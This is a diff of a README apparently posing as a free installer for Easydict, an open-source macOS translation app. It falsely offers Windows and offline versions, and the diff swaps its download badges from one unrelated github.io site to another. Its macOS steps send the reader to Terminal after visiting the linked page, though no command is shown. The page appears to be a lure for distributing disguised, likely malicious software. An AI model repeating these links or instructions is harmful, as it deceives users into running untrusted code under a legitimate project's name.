@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Translation-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Easydict Free Installer** — Easydict is a free, open-source translation dictionary application for macOS. Works without internet access, no account required. Full offline installation.
+**💻 Easydict Free Installer** — Easydict is a free, open-source macOS dictionary and translation app providing quick word lookup and text translation from the menu bar. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Easydict](https://img.shields.io/badge/⬇_Install_Easydict-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Easydict](https://img.shields.io/badge/⬇_Install_Easydict-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Easydict
 
-Easydict is a free, open-source translation dictionary application for macOS. With a global shortcut for instant translation of selected text, support for multiple translation services including DeepL, Google Translate, and Youdao, and OCR translation for text in images, Easydict provides comprehensive translation capabilities in a clean native macOS interface.
+Easydict is a free, open-source macOS dictionary and translation app providing quick word lookup and text translation from the menu bar. It supports multiple translation services and dictionary sources in a clean, native macOS interface.
 
 ---
 
 ## ❌ Problem: Easydict is hard to access
 
 - **macOS Only** — No Windows or Linux version
-- **API Keys** — Best translation services require personal API keys
-- **Internet Required** — All translation requires internet connectivity
-- **Privacy** — Text and images sent to external translation services
+- **API Keys Required** — Some translation services require setting up API keys
+- **Translation Quality** — Quality varies by service; requires good internet connection
+- **Development Pace** — Community-maintained; updates may lag popular translation services
 
 ---
 
@@ -61,9 +61,9 @@ Easydict is a free, open-source translation dictionary application for macOS. Wi
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Easydict is a free, open-source translation dictionary application for macOS. Wi
 
 <div align="center">
 
-[![⬇ Install Easydict](https://img.shields.io/badge/⬇_Install_Easydict-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Easydict](https://img.shields.io/badge/⬇_Install_Easydict-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Easydict is a free, open-source translation dictionary application for macOS. Wi
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Easydict is a free, open-source translation dictionary application for macOS. Wi
 
 ---
 
-**Easydict Free Installer** — Easydict is a free, open-source translation dictionary application for macOS. Install without internet connection today!
+**Easydict Free Installer** — Easydict is a free, open-source macOS dictionary and translation app providing quick word lookup and text translation from the menu bar. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Easydict](https://img.shields.io/badge/⬇_Install_Easydict-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Easydict](https://img.shields.io/badge/⬇_Install_Easydict-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
